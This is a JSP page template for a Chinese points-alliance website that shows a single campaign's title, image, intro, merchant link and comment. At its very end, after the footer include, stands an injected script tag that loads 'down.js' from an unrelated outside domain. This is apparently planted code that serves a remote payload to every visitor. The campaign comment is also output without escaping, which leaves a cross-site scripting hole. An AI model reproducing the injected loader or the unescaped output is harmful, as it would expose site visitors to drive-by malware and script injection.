<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-积分活动-${result.campaign.title}"/> 
<%@ include file="IncludeTop.jsp" %>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td background="images/left_border.gif" width="10"></td>
    <td width="198" height="129" valign="top">
		<%@ include file="searchProductBar.jsp" %>
		<%@ include file="searchAllBar.jsp" %>
		<%@ include file="newsBar.jsp" %>
	</td>
    <td bgcolor="#FFFFFF" valign="top" width="562"> 
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr> 
          <td colspan="4" height="13" background="images/splitLine.jpg"></td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td width="181">&nbsp;</td>
          <td align="right">&nbsp;</td>
          <td rowspan="2" width="25">&nbsp;</td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td width="181">&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
      </table>

      <c:set var="campaign" value="${result.campaign}"/> 
      <table cellspacing="0" cellpadding="0" width="100%" height="100%" border="0" bgcolor="#FFFFFF">
        <tr> 
          <td align="center" rowspan="2" width="101"><img src='images/campaign/<c:out value="${campaign.campaignNo}"/>.jpg' width="85" height="85" border="0" ></td>
          <td height="31"><c:out value="${campaign.title}"/></td>
        </tr>
        <tr> 
          <td height="57"><c:out value="${campaign.intro}"/></td>
        </tr>
        <tr> 
          <td align="center" colspan="2"> <a href='<c:url value="/getMerchantInfo.do"/>?merchantNo=<c:out value="${campaign.merchantNo}"/>'><c:out value="${campaign.merchantName}"/></a> 
          </td>
        </tr>
        <tr> 
          <td align="center" colspan="2"><c:out value="${campaign.comment}" escapeXml="false"/></td>
        </tr>
      </table>
    </td>
    <td width="10" bgcolor="#FFFFFF" valign="top" background="images/right_border.gif">&nbsp;</td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>